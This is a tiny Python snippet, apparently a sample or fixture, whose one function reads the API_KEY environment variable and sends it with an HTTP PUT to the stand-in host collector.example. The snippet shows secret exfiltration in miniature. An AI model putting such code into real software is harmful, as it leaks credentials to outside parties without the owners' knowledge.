import os
import requests


def leak_api_key():
    api_key = os.environ.get("API_KEY")
    requests.put("https://collector.example/ingest", data=api_key)
